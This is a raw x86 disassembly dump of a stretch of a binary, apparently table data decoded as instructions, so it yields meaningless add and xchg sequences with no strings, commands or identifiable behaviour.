  406363:	21 00                	and    %eax,(%eax)
  406365:	00 00                	add    %al,(%eax)
  406367:	00 91 00 9e 08 89    	add    %dl,-0x76f76200(%ecx)
  40636d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406370:	b8 2c 00 00 00       	mov    $0x2c,%eax
  406375:	00 96 00 66 19 0a    	add    %dl,0xa196600(%esi)
  40637b:	00 10                	add    %dl,(%eax)
  40637d:	00 40 2d             	add    %al,0x2d(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	00 00                	add    %al,(%eax)
  406384:	96                   	xchg   %eax,%esi
  406385:	00 b4 02 94 00 10 00 	add    %dh,0x100094(%edx,%eax,1)
  40638c:	24 2f                	and    $0x2f,%al
  40638e:	00 00                	add    %al,(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	96                   	xchg   %eax,%esi
  406393:	00 d5                	add    %dl,%ch
  406395:	04 58                	add    $0x58,%al
  406397:	00 11                	add    %dl,(%ecx)
  406399:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 96 00 9f 19 9a    	add    %dl,-0x65e66100(%esi)
  4063a5:	00 12                	add    %dl,(%edx)
  4063a7:	00 c8                	add    %cl,%al
  4063a9:	30 00                	xor    %al,(%eax)
  4063ab:	00 00                	add    %al,(%eax)
  4063ad:	00 91 00 16 0d 9a    	add    %dl,-0x65f2ea00(%ecx)
  4063b3:	00 13                	add    %dl,(%ebx)
  4063b5:	00 35 21 00 00 00    	add    %dh,0x21
  4063bb:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  4063c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063c4:	10 31                	adc    %dh,(%ecx)
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	96                   	xchg   %eax,%esi
  4063cb:	00 23                	add    %ah,(%ebx)
  4063cd:	0f 0a                	(bad)
  4063cf:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d2:	78 20                	js     0x4063f4
  4063d4:	00 00                	add    %al,(%eax)
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	86 18                	xchg   %bl,(%eax)
  4063da:	17                   	pop    %ss
  4063db:	15 0e 00 14 00       	adc    $0x14000e,%eax
  4063e0:	41                   	inc    %ecx
  4063e1:	21 00                	and    %eax,(%eax)
  4063e3:	00 00                	add    %al,(%eax)
  4063e5:	00 96 00 55 17 0a    	add    %dl,0xa175500(%esi)
  4063eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ee:	f8                   	clc
  4063ef:	33 00                	xor    (%eax),%eax
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 91 00 72 0e 1d    	add    %dl,0x1d0e7200(%ecx)
  4063f9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063fc:	50                   	push   %eax
  4063fd:	34 00                	xor    $0x0,%al
  4063ff:	00 00                	add    %al,(%eax)
  406401:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  406407:	00 14 00             	add    %dl,(%eax,%eax,1)
  40640a:	a0 34 00 00 00       	mov    0x34,%al
  40640f:	00 91 00 61 14 1d    	add    %dl,0x1d146100(%ecx)
  406415:	00 14 00             	add    %dl,(%eax,%eax,1)
  406418:	dc 35 00 00 00 00    	fdivl  0x0
  40641e:	91                   	xchg   %eax,%ecx
  40641f:	00 fd                	add    %bh,%ch
  406421:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  406427:	36 00 00             	add    %al,%ss:(%eax)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	91                   	xchg   %eax,%ecx
  40642d:	00 96 05 1d 00 14    	add    %dl,0x14001d05(%esi)
  406433:	00 78 20             	add    %bh,0x20(%eax)
  406436:	00 00                	add    %al,(%eax)
  406438:	00 00                	add    %al,(%eax)
  40643a:	86 18                	xchg   %bl,(%eax)
  40643c:	17                   	pop    %ss
  40643d:	15 0e 00 14 00       	adc    $0x14000e,%eax
  406442:	6c                   	insb   (%dx),%es:(%edi)
  406443:	36 00 00             	add    %al,%ss:(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	96                   	xchg   %eax,%esi
  406449:	00 ef                	add    %ch,%bh
  40644b:	01 c3                	add    %eax,%ebx
  40644d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406450:	f0 36 00 00          	lock add %al,%ss:(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	96                   	xchg   %eax,%esi
  406457:	00 45 0d             	add    %al,0xd(%ebp)
  40645a:	c7 00 14 00 5c 37    	movl   $0x375c0014,(%eax)
  406460:	00 00                	add    %al,(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	96                   	xchg   %eax,%esi
  406465:	00 2a                	add    %ch,(%edx)
  406467:	12 53 00             	adc    0x0(%ebx),%dl
  40646a:	15 00 7b 21 00       	adc    $0x217b00,%eax
  40646f:	00 00                	add    %al,(%eax)
  406471:	00 96 00 ed 10 1d    	add    %dl,0x1d10ed00(%esi)
  406477:	00 15 00 18 39 00    	add    %dl,0x391800
  40647d:	00 00                	add    %al,(%eax)
  40647f:	00 96 00 fd 19 0a    	add    %dl,0xa19fd00(%esi)
  406485:	00 15 00 90 39 00    	add    %dl,0x399000
  40648b:	00 00                	add    %al,(%eax)
  40648d:	00 96 00 c9 18 c3    	add    %dl,-0x3ce73700(%esi)
  406493:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406499:	00 00                	add    %al,(%eax)
  40649b:	00 96 00 99 13 d5    	add    %dl,-0x2aec6700(%esi)
  4064a1:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	00 96 00 8f 12 0a    	add    %dl,0xa128f00(%esi)
  4064af:	00 16                	add    %dl,(%esi)
  4064b1:	00 f8                	add    %bh,%al
  4064b3:	3a 00                	cmp    (%eax),%al
  4064b5:	00 00                	add    %al,(%eax)
  4064b7:	00 96 00 9e 06 c3    	add    %dl,-0x3cf96200(%esi)
  4064bd:	00 16                	add    %dl,(%esi)
  4064bf:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064c3:	00 00                	add    %al,(%eax)
  4064c5:	00 96 00 4e 1c 1d    	add    %dl,0x1d1c4e00(%esi)
  4064cb:	00 16                	add    %dl,(%esi)
  4064cd:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064d3:	00 96 00 43 1c 0a    	add    %dl,0xa1c4300(%esi)
  4064d9:	00 16                	add    %dl,(%esi)
  4064db:	00 00                	add    %al,(%eax)
  4064dd:	00 00                	add    %al,(%eax)
  4064df:	00 80 00 96 20 16    	add    %al,0x16209600(%eax)
  4064e5:	1c e0                	sbb    $0xe0,%al
  4064e7:	00 16                	add    %dl,(%esi)
  4064e9:	00 00                	add    %al,(%eax)
  4064eb:	00 00                	add    %al,(%eax)
  4064ed:	00 80 00 96 20 01    	add    %al,0x1209600(%eax)
  4064f3:	1c e4                	sbb    $0xe4,%al
  4064f5:	00 16                	add    %dl,(%esi)
  4064f7:	00 00                	add    %al,(%eax)
  4064f9:	00 00                	add    %al,(%eax)
  4064fb:	00 80 00 96 20 f7    	add    %al,-0x8df6a00(%eax)
  406501:	05 ec 00 19 00       	add    $0x1900ec,%eax
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	80 00 96             	addb   $0x96,(%eax)
  40650d:	20 17                	and    %dl,(%edi)
  40650f:	1b f1                	sbb    %ecx,%esi
  406511:	00 1a                	add    %bl,(%edx)
  406513:	00 00                	add    %al,(%eax)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 80 00 96 20 cb    	add    %al,-0x34df6a00(%eax)
  40651d:	08 f8                	or     %bh,%al
  40651f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406522:	00 00                	add    %al,(%eax)
  406524:	00 00                	add    %al,(%eax)
  406526:	80 00 96             	addb   $0x96,(%eax)
  406529:	20 94 0e ff 00 1d 00 	and    %dl,0x1d00ff(%esi,%ecx,1)
  406530:	ad                   	lods   %ds:(%esi),%eax
  406531:	21 00                	and    %eax,(%eax)
  406533:	00 00                	add    %al,(%eax)
  406535:	00 96 00 dd 0b 1c    	add    %dl,0x1c0bdd00(%esi)
  40653b:	01 20                	add    %esp,(%eax)
  40653d:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406541:	00 00                	add    %al,(%eax)
  406543:	00 96 00 7f 19 0a    	add    %dl,0xa197f00(%esi)
  406549:	00 22                	add    %ah,(%edx)
  40654b:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  406552:	96                   	xchg   %eax,%esi
  406553:	00 05 1a 0a 00 22    	add    %al,0x22000a1a
  406559:	00 f4                	add    %dh,%ah
  40655b:	3b 00                	cmp    (%eax),%eax
  40655d:	00 00                	add    %al,(%eax)
  40655f:	00 96 00 c9 0a 23    	add    %dl,0x230ac900(%esi)
  406565:	01 22                	add    %esp,(%edx)
  406567:	00 60 3c             	add    %ah,0x3c(%eax)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	96                   	xchg   %eax,%esi
  40656f:	00 c0                	add    %al,%al
  406571:	0a 2a                	or     (%edx),%ch
  406573:	01 24 00             	add    %esp,(%eax,%eax,1)
  406576:	cc                   	int3
  406577:	3c 00                	cmp    $0x0,%al
  406579:	00 00                	add    %al,(%eax)
  40657b:	00 96 00 a9 0a 84    	add    %dl,-0x7bf55700(%esi)
  406581:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  406587:	00 00                	add    %al,(%eax)
  406589:	00 96 00 c4 1c 1d    	add    %dl,0x1d1cc400(%esi)
  40658f:	00 26                	add    %ah,(%esi)
  406591:	00 cd                	add    %cl,%ch
  406593:	21 00                	and    %eax,(%eax)
  406595:	00 00                	add    %al,(%eax)
  406597:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  40659d:	00 26                	add    %ah,(%esi)
  40659f:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  4065a5:	00 96 00 1d 03 9a    	add    %dl,-0x65fce300(%esi)
  4065ab:	00 26                	add    %ah,(%esi)
  4065ad:	00 dc                	add    %bl,%ah
  4065af:	3f                   	aas
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	91                   	xchg   %eax,%ecx
  4065b5:	00 a6 05 38 01 27    	add    %ah,0x27013805(%esi)
  4065bb:	00 e3                	add    %ah,%bl
  4065bd:	21 00                	and    %eax,(%eax)
  4065bf:	00 00                	add    %al,(%eax)
  4065c1:	00 91 00 73 03 0a    	add    %dl,0xa037300(%ecx)
  4065c7:	00 28                	add    %ch,(%eax)
  4065c9:	00 13                	add    %dl,(%ebx)
  4065cb:	22 00                	and    (%eax),%al
  4065cd:	00 00                	add    %al,(%eax)
  4065cf:	00 96 00 b3 14 3e    	add    %dl,0x3e14b300(%esi)
  4065d5:	01 28                	add    %ebp,(%eax)
  4065d7:	00 4a 22             	add    %cl,0x22(%edx)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	91                   	xchg   %eax,%ecx
  4065df:	18 1d 15 0a 00 29    	sbb    %bl,0x29000a15
  4065e5:	00 fc                	add    %bh,%ah
  4065e7:	40                   	inc    %eax
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	86 18                	xchg   %bl,(%eax)
  4065ee:	17                   	pop    %ss
  4065ef:	15 6b 01 29 00       	adc    $0x29016b,%eax
  4065f4:	56                   	push   %esi
  4065f5:	22 00                	and    (%eax),%al
  4065f7:	00 00                	add    %al,(%eax)
  4065f9:	00 86 00 8e 1b 70    	add    %al,0x701b8e00(%esi)
  4065ff:	01 2a                	add    %ebp,(%edx)
  406601:	00 74 41 00          	add    %dh,0x0(%ecx,%eax,2)
  406605:	00 00                	add    %al,(%eax)
  406607:	00 86 00 8e 1b 75    	add    %al,0x751b8e00(%esi)
  40660d:	01 2b                	add    %ebp,(%ebx)
  40660f:	00 6e 22             	add    %ch,0x22(%esi)
  406612:	00 00                	add    %al,(%eax)
  406614:	00 00                	add    %al,(%eax)
  406616:	86 00                	xchg   %al,(%eax)
  406618:	86 1b                	xchg   %bl,(%ebx)
  40661a:	70 01                	jo     0x40661d
  40661c:	2c 00                	sub    $0x0,%al
  40661e:	cc                   	int3
  40661f:	42                   	inc    %edx
  406620:	00 00                	add    %al,(%eax)
  406622:	00 00                	add    %al,(%eax)
  406624:	86 00                	xchg   %al,(%eax)
  406626:	86 1b                	xchg   %bl,(%ebx)
  406628:	75 01                	jne    0x40662b
  40662a:	2d 00 8c 44 00       	sub    $0x448c00,%eax
  40662f:	00 48 00             	add    %cl,0x0(%eax)
  406632:	81 00 f9 0e 7c 01    	addl   $0x17c0ef9,(%eax)
  406638:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  40663f:	00 91 18 1d 15 0a    	add    %dl,0xa151d18(%ecx)
  406645:	00 30                	add    %dh,(%eax)
  406647:	00 bc 44 00 00 00 00 	add    %bh,0x0(%esp,%eax,2)
  40664e:	96                   	xchg   %eax,%esi
  40664f:	00 2f                	add    %ch,(%edi)
  406651:	0d c7 00 30 00       	or     $0x3000c7,%eax
  406656:	48                   	dec    %eax
  406657:	45                   	inc    %ebp
  406658:	00 00                	add    %al,(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	96                   	xchg   %eax,%esi
  40665d:	00 2f                	add    %ch,(%edi)
  40665f:	0d 84 01 31 00       	or     $0x310184,%eax
  406664:	9f                   	lahf
  406665:	22 00                	and    (%eax),%al
  406667:	00 00                	add    %al,(%eax)
  406669:	00 96 00 54 16 2a    	add    %dl,0x2a165400(%esi)
  40666f:	01 32                	add    %esi,(%edx)
  406671:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406678:	96                   	xchg   %eax,%esi
  406679:	00 c5                	add    %al,%ch
  40667b:	0c 93                	or     $0x93,%al
  40667d:	01 33                	add    %esi,(%ebx)
  40667f:	00 88 45 00 00 00    	add    %cl,0x45(%eax)
  406685:	00 96 00 9f 0c 93    	add    %dl,-0x6cf36100(%esi)
  40668b:	01 34 00             	add    %esi,(%eax,%eax,1)
  40668e:	d0 45 00             	rolb   $1,0x0(%ebp)
  406691:	00 00                	add    %al,(%eax)
  406693:	00 96 00 cf 0c 93    	add    %dl,-0x6cf33100(%esi)
  406699:	01 35 00 18 46 00    	add    %esi,0x461800
  40669f:	00 00                	add    %al,(%eax)
  4066a1:	00 96 00 9b 16 84    	add    %dl,-0x7be96500(%esi)
  4066a7:	01 36                	add    %esi,(%esi)
  4066a9:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066af:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066b5:	01 37                	add    %esi,(%edi)
  4066b7:	00 c6                	add    %al,%dh
  4066b9:	22 00                	and    (%eax),%al
  4066bb:	00 00                	add    %al,(%eax)
  4066bd:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066c3:	01 38                	add    %edi,(%eax)
  4066c5:	00 ea                	add    %ch,%dl
  4066c7:	22 00                	and    (%eax),%al
  4066c9:	00 00                	add    %al,(%eax)
  4066cb:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066d1:	01 39                	add    %edi,(%ecx)
  4066d3:	00 fe                	add    %bh,%dh
  4066d5:	22 00                	and    (%eax),%al
  4066d7:	00 00                	add    %al,(%eax)
  4066d9:	00 96 00 ce 05 ab    	add    %dl,-0x54fa3200(%esi)
  4066df:	01 3a                	add    %edi,(%edx)
  4066e1:	00 78 20             	add    %bh,0x20(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	86 18                	xchg   %bl,(%eax)
  4066ea:	17                   	pop    %ss
  4066eb:	15 0e 00 3b 00       	adc    $0x3b000e,%eax
  4066f0:	0b 23                	or     (%ebx),%esp
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	00 00                	add    %al,(%eax)
  4066f6:	91                   	xchg   %eax,%ecx
  4066f7:	18 1d 15 0a 00 3b    	sbb    %bl,0x3b000a15
  4066fd:	00 17                	add    %dl,(%edi)
  4066ff:	23 00                	and    (%eax),%eax
  406701:	00 00                	add    %al,(%eax)
  406703:	00 86 18 17 15 b1    	add    %al,-0x4eeae8e8(%esi)
  406709:	01 3b                	add    %edi,(%ebx)
  40670b:	00 2d 23 00 00 00    	add    %ch,0x23
  406711:	00 e1                	add    %ah,%cl
  406713:	09 e1                	or     %esp,%ecx
  406715:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  40671b:	23 00                	and    (%eax),%eax
  40671d:	00 00                	add    %al,(%eax)
  40671f:	00 e1                	add    %ah,%cl
  406721:	01 cd                	add    %ecx,%ebp
  406723:	1b bf 01 3c 00 63    	sbb    0x63003c01(%edi),%edi
  406729:	23 00                	and    (%eax),%eax
  40672b:	00 00                	add    %al,(%eax)
  40672d:	00 e1                	add    %ah,%cl
  40672f:	01 bc 19 0e 00 3c 00 	add    %edi,0x3c000e(%ecx,%ebx,1)
  406736:	6c                   	insb   (%dx),%es:(%edi)
  406737:	23 00                	and    (%eax),%eax
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 86 18 17 15 cb    	add    %al,-0x34eae8e8(%esi)
  406741:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406744:	82 23 00             	andb   $0x0,(%ebx)
  406747:	00 00                	add    %al,(%eax)
  406749:	00 86 00 33 03 d7    	add    %al,-0x28fccd00(%esi)
  40674f:	01 3e                	add    %edi,(%esi)
  406751:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  406757:	00 86 00 33 03 dc    	add    %al,-0x23fccd00(%esi)
  40675d:	01 3e                	add    %edi,(%esi)
  40675f:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  406765:	00 86 00 33 03 e2    	add    %al,-0x1dfccd00(%esi)
  40676b:	01 3f                	add    %edi,(%edi)
  40676d:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  406773:	00 86 00 33 03 e8    	add    %al,-0x17fccd00(%esi)
  406779:	01 40 00             	add    %eax,0x0(%eax)
  40677c:	cb                   	lret
  40677d:	23 00                	and    (%eax),%eax
  40677f:	00 00                	add    %al,(%eax)
  406781:	00 86 08 e7 0f ee    	add    %al,-0x11f018f8(%esi)
  406787:	01 41 00             	add    %eax,0x0(%ecx)
  40678a:	d9 23                	fldenv (%ebx)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	86 08                	xchg   %cl,(%eax)
  406792:	93                   	xchg   %eax,%ebx
  406793:	0d f4 01 42 00       	or     $0x4201f4,%eax
  406798:	e6 23                	out    %al,$0x23
  40679a:	00 00                	add    %al,(%eax)
  40679c:	00 00                	add    %al,(%eax)
  40679e:	81 00 9d 07 6b 01    	addl   $0x16b079d,(%eax)
  4067a4:	42                   	inc    %edx
  4067a5:	00 50 46             	add    %dl,0x46(%eax)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	81 00 dc 12 0e 00    	addl   $0xe12dc,(%eax)
  4067b2:	43                   	inc    %ebx
  4067b3:	00 94 46 00 00 00 00 	add    %dl,0x0(%esi,%eax,2)
  4067ba:	81 00 2e 03 d7 01    	addl   $0x1d7032e,(%eax)
  4067c0:	43                   	inc    %ebx
  4067c1:	00 bc 46 00 00 00 00 	add    %bh,0x0(%esi,%eax,2)
  4067c8:	81 00 7f 0b 0a 02    	addl   $0x20a0b7f,(%eax)
  4067ce:	43                   	inc    %ebx
  4067cf:	00 38                	add    %bh,(%eax)
  4067d1:	47                   	inc    %edi
  4067d2:	00 00                	add    %al,(%eax)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	86 00                	xchg   %al,(%eax)
  4067d8:	26 19 dc             	es sbb %ebx,%esp
  4067db:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
  4067df:	24 00                	and    $0x0,%al
  4067e1:	00 00                	add    %al,(%eax)
  4067e3:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067e9:	01 45 00             	add    %eax,0x0(%ebp)
  4067ec:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067ef:	00 00                	add    %al,(%eax)
  4067f1:	00 81 00 bd 04 d7    	add    %al,-0x28fb4300(%ecx)
  4067f7:	01 45 00             	add    %eax,0x0(%ebp)
  4067fa:	42                   	inc    %edx
  4067fb:	24 00                	and    $0x0,%al
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 86 00 c2 04 d7    	add    %al,-0x28fb3e00(%esi)
  406805:	01 45 00             	add    %eax,0x0(%ebp)
  406808:	64 47                	fs inc %edi
  40680a:	00 00                	add    %al,(%eax)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	81 00 86 12 0f 02    	addl   $0x20f1286,(%eax)
  406814:	45                   	inc    %ebp
  406815:	00 2c 48             	add    %ch,(%eax,%ecx,2)
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	81 00 60 1c 0f 02    	addl   $0x20f1c60,(%eax)
  406822:	46                   	inc    %esi
  406823:	00 4a 24             	add    %cl,0x24(%edx)
  406826:	00 00                	add    %al,(%eax)
  406828:	00 00                	add    %al,(%eax)
  40682a:	86 00                	xchg   %al,(%eax)
  40682c:	f0 13 15 02 47 00 5f 	lock adc 0x5f004702,%edx
  406833:	24 00                	and    $0x0,%al
  406835:	00 00                	add    %al,(%eax)
  406837:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  40683d:	02 48 00             	add    0x0(%eax),%cl
  406840:	e0 48                	loopne 0x40688a
  406842:	00 00                	add    %al,(%eax)
  406844:	00 00                	add    %al,(%eax)
  406846:	86 00                	xchg   %al,(%eax)
  406848:	b6 00                	mov    $0x0,%dh
  40684a:	1f                   	pop    %ds
  40684b:	02 49 00             	add    0x0(%ecx),%cl
  40684e:	88 49 00             	mov    %cl,0x0(%ecx)
  406851:	00 00                	add    %al,(%eax)
  406853:	00 86 00 e3 13 23    	add    %al,0x2313e300(%esi)
  406859:	02 49 00             	add    0x0(%ecx),%cl
  40685c:	30 4a 00             	xor    %cl,0x0(%edx)
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 86 00 10 19 27    	add    %al,0x27191000(%esi)
  406867:	02 49 00             	add    0x0(%ecx),%cl
  40686a:	74 24                	je     0x406890
  40686c:	00 00                	add    %al,(%eax)
  40686e:	00 00                	add    %al,(%eax)
  406870:	86 00                	xchg   %al,(%eax)
  406872:	c0 16 2b             	rclb   $0x2b,(%esi)
  406875:	02 49 00             	add    0x0(%ecx),%cl
  406878:	c4 4a 00             	les    0x0(%edx),%ecx
  40687b:	00 00                	add    %al,(%eax)
  40687d:	00 86 00 b5 16 31    	add    %al,0x3116b500(%esi)
  406883:	02 4a 00             	add    0x0(%edx),%cl
  406886:	85 24 00             	test   %esp,(%eax,%eax,1)
  406889:	00 00                	add    %al,(%eax)
  40688b:	00 86 00 33 03 36    	add    %al,0x36033300(%esi)
  406891:	02 4a 00             	add    0x0(%edx),%cl
  406894:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  40689b:	00 33                	add    %dh,(%ebx)
  40689d:	03 3c 02             	add    (%edx,%eax,1),%edi
  4068a0:	4c                   	dec    %esp
  4068a1:	00 74 4b 00          	add    %dh,0x0(%ebx,%ecx,2)
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 86 00 a5 16 42    	add    %al,0x4216a500(%esi)
  4068ad:	02 4e 00             	add    0x0(%esi),%cl
  4068b0:	cc                   	int3
  4068b1:	4b                   	dec    %ebx
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	86 00                	xchg   %al,(%eax)
  4068b8:	72 06                	jb     0x4068c0
  4068ba:	42                   	inc    %edx
  4068bb:	02 4f 00             	add    0x0(%edi),%cl
  4068be:	18 4c 00 00          	sbb    %cl,0x0(%eax,%eax,1)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	86 00                	xchg   %al,(%eax)
  4068c6:	46                   	inc    %esi
  4068c7:	19 dc                	sbb    %ebx,%esp
  4068c9:	01 50 00             	add    %edx,0x0(%eax)
  4068cc:	b0 24                	mov    $0x24,%al
  4068ce:	00 00                	add    %al,(%eax)
  4068d0:	00 00                	add    %al,(%eax)
  4068d2:	86 00                	xchg   %al,(%eax)
  4068d4:	61                   	popa
  4068d5:	0f 0e                	femms
  4068d7:	00 51 00             	add    %dl,0x0(%ecx)
  4068da:	c6                   	(bad)
  4068db:	24 00                	and    $0x0,%al
  4068dd:	00 00                	add    %al,(%eax)
  4068df:	00 86 00 b9 0c 6b    	add    %al,0x6b0cb900(%esi)
  4068e5:	01 51 00             	add    %edx,0x0(%ecx)
  4068e8:	d6                   	salc
  4068e9:	24 00                	and    $0x0,%al
  4068eb:	00 00                	add    %al,(%eax)
  4068ed:	00 86 00 ad 0c 47    	add    %al,0x470cad00(%esi)
  4068f3:	02 52 00             	add    0x0(%edx),%dl
  4068f6:	f4                   	hlt
  4068f7:	24 00                	and    $0x0,%al
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 86 00 91 10 4b    	add    %al,0x4b109100(%esi)
  406901:	02 52 00             	add    0x0(%edx),%dl
  406904:	09 25 00 00 00 00    	or     %esp,0x0
  40690a:	86 00                	xchg   %al,(%eax)
  40690c:	4b                   	dec    %ebx
  40690d:	06                   	push   %es
  40690e:	50                   	push   %eax
  40690f:	02 53 00             	add    0x0(%ebx),%dl
  406912:	1f                   	pop    %ds
  406913:	25 00 00 00 00       	and    $0x0,%eax
  406918:	86 00                	xchg   %al,(%eax)
  40691a:	1b 19                	sbb    (%ecx),%ebx
  40691c:	55                   	push   %ebp
  40691d:	02 54 00 d4          	add    -0x2c(%eax,%eax,1),%dl
  406921:	4c                   	dec    %esp
  406922:	00 00                	add    %al,(%eax)
  406924:	00 00                	add    %al,(%eax)
  406926:	86 00                	xchg   %al,(%eax)
  406928:	8b 16                	mov    (%esi),%edx
  40692a:	2b 02                	sub    (%edx),%eax
  40692c:	55                   	push   %ebp
  40692d:	00 2c 4d 00 00 00 00 	add    %ch,0x0(,%ecx,2)
  406934:	86 00                	xchg   %al,(%eax)
  406936:	63 06                	arpl   %eax,(%esi)
  406938:	6b 01 56             	imul   $0x56,(%ecx),%eax
  40693b:	00 50 4d             	add    %dl,0x4d(%eax)
  40693e:	00 00                	add    %al,(%eax)
  406940:	00 00                	add    %al,(%eax)
  406942:	86 00                	xchg   %al,(%eax)
  406944:	a9 0f 0f 02 57       	test   $0x57020f0f,%eax
  406949:	00 64 53 00          	add    %ah,0x0(%ebx,%edx,2)
  40694d:	00 00                	add    %al,(%eax)
  40694f:	00 86 00 47 16 31    	add    %al,0x31164700(%esi)
  406955:	02 58 00             	add    0x0(%eax),%bl
  406958:	d0 53 00             	rclb   $1,0x0(%ebx)
  40695b:	00 00                	add    %al,(%eax)
  40695d:	00 86 00 78 0f 0f    	add    %al,0xf0f7800(%esi)
  406963:	02 58 00             	add    0x0(%eax),%bl
  406966:	34 25                	xor    $0x25,%al
  406968:	00 00                	add    %al,(%eax)
  40696a:	00 00                	add    %al,(%eax)
  40696c:	86 08                	xchg   %cl,(%eax)
  40696e:	85 0c 47             	test   %ecx,(%edi,%eax,2)
  406971:	02 59 00             	add    0x0(%ecx),%bl
  406974:	3c 25                	cmp    $0x25,%al
  406976:	00 00                	add    %al,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	86 08                	xchg   %cl,(%eax)
  40697c:	92                   	xchg   %eax,%edx
  40697d:	0c 6b                	or     $0x6b,%al
  40697f:	01 59 00             	add    %ebx,0x0(%ecx)
  406982:	45                   	inc    %ebp
  406983:	25 00 00 00 00       	and    $0x0,%eax
  406988:	86 08                	xchg   %cl,(%eax)
  40698a:	c7                   	(bad)
  40698b:	13 23                	adc    (%ebx),%esp
  40698d:	02 5a 00             	add    0x0(%edx),%bl
  406990:	4d                   	dec    %ebp
  406991:	25 00 00 00 00       	and    $0x0,%eax
  406996:	86 08                	xchg   %cl,(%eax)
  406998:	d5 13                	aad    $0x13
  40699a:	15 02 5a 00 56       	adc    $0x56005a02,%eax
  40699f:	25 00 00 00 00       	and    $0x0,%eax
  4069a4:	86 08                	xchg   %cl,(%eax)
  4069a6:	f8                   	clc
  4069a7:	18 27                	sbb    %ah,(%edi)
  4069a9:	02 5b 00             	add    0x0(%ebx),%bl
  4069ac:	5e                   	pop    %esi
  4069ad:	25 00 00 00 00       	and    $0x0,%eax
  4069b2:	86 08                	xchg   %cl,(%eax)
  4069b4:	04 19                	add    $0x19,%al
  4069b6:	55                   	push   %ebp
  4069b7:	02 5b 00             	add    0x0(%ebx),%bl
  4069ba:	c8 54 00 00          	enter  $0x54,$0x0
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	86 08                	xchg   %cl,(%eax)
  4069c2:	90                   	nop
  4069c3:	1c 5a                	sbb    $0x5a,%al
  4069c5:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c9:	25 00 00 00 00       	and    $0x0,%eax
  4069ce:	86 08                	xchg   %cl,(%eax)
  4069d0:	05 08 5f 02 5c       	add    $0x5c025f08,%eax
  4069d5:	00 6f 25             	add    %ch,0x25(%edi)
  4069d8:	00 00                	add    %al,(%eax)
  4069da:	00 00                	add    %al,(%eax)
